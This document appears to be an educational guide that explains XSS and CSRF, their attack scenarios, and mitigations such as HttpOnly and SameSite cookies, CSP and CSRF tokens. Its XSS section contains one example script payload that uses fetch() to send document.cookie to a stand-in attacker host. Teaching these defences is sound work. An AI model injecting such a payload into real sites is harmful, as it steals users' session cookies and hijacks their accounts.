# 🛡️ Web Security Essentials: XSS vs. CSRF

A comprehensive guide to understanding common web vulnerabilities and how to effectively mitigate them using modern security practices.

---

## 1. XSS (Cross-Site Scripting)

**Cross-Site Scripting (XSS)** is an injection attack where an attacker embeds malicious JavaScript code into a website. This code is then executed within the browsers of other users who visit the site.

### 📝 The Attack Scenario: Comment System
1.  **Injection:** An attacker submits a comment containing a `<script>` tag (e.g., `Hello! <script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`).
2.  **Storage:** The malicious string is saved directly into the database.
3.  **Execution:** When other users load the page, if the application doesn't sanitize the input, the string is parsed as live code.
4.  **Impact:** The script runs in the victim's browser, hijacking **Cookies**, **localStorage**, **sessionStorage**, or performing actions on the user's behalf.

### 🛡️ How to Prevent XSS
* **Safe Rendering:** Always use `.textContent` instead of `.innerHTML` to prevent browsers from parsing strings as HTML.
* **Cookie Protection:** Set the `HttpOnly` flag on cookies so they cannot be accessed via JavaScript (`document.cookie`).
* **Modern Frameworks:** Use React, Vue, or Angular, which automatically escape content by default.
* **CSP (Content Security Policy):** Implement a strict CSP header to restrict which scripts are allowed to run on your page.



---

## 2. CSRF (Cross-Site Request Forgery)

**CSRF** is an attack that tricks a victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired action on their behalf.

### 📝 The Attack Scenario: Malicious Links
1.  **Deception:** An attacker sends you a link to a website they control.
2.  **Trigger:** When you visit the malicious site, hidden scripts execute in the background.
3.  **Exploitation:** These scripts send a forged request (e.g., `/transfer-money`) to a target website where you are already logged in. Because browsers automatically include cookies for that domain, the server thinks the request is legitimate.

### 🛡️ Defensive Mechanisms
* **CSRF Tokens:** The server generates a unique, unpredictable token and hides it in the DOM (usually a hidden input field). Since other domains cannot read your DOM (due to the Same-Origin Policy), the attacker cannot include this token in their forged request.
* **SameSite Attribute:** Setting `SameSite=Strict` or `Lax` on cookies prevents them from being sent during cross-site requests.



---

## 3. Comparison: XSS vs. CSRF

| Feature | XSS | CSRF |
| :--- | :--- | :--- |
| **Origin** | Same domain (Malicious code on your site) | Different domain (Malicious site linking to yours) |
| **Access** | Can read **DOM, localStorage, Cookies** | Can only **send** cookies (cannot read them) |
| **Bypass** | Can bypass backend domain validation | Blocked by Same-Origin Policy (SOP) |
| **Severity** | **Higher** (Complete control over the session) | **Medium** (Limited to specific actions) |

---

## 🚀 Best Practices for Modern Applications

To achieve a high level of security, implement a "Defense in Depth" strategy:

### 1. Secure JWT Storage
Store your **JWT (JSON Web Token)** in a cookie with the following flags:
* `HttpOnly`: Prevents JavaScript (XSS) from reading the token.
* `Secure`: Ensures the cookie is only sent over HTTPS.
* `SameSite=Lax/Strict`: Restricts the cookie from being sent in CSRF scenarios.

### 2. Dual-Layer Protection
Use **both** JWT in cookies and CSRF Tokens:
* **JWT in Cookies:** Protects against token theft via XSS.
* **CSRF Tokens:** Provides a fallback defense for older browsers where `SameSite` might not be fully supported, preventing forged requests entirely.
* **Sanitization:** Always validate and sanitize user input to solve the root cause of XSS.

> **Conclusion:** Solve CSRF first with tokens and secure cookie attributes to lock down the request flow, then eliminate XSS vulnerabilities by ensuring safe data handling and using modern framework features.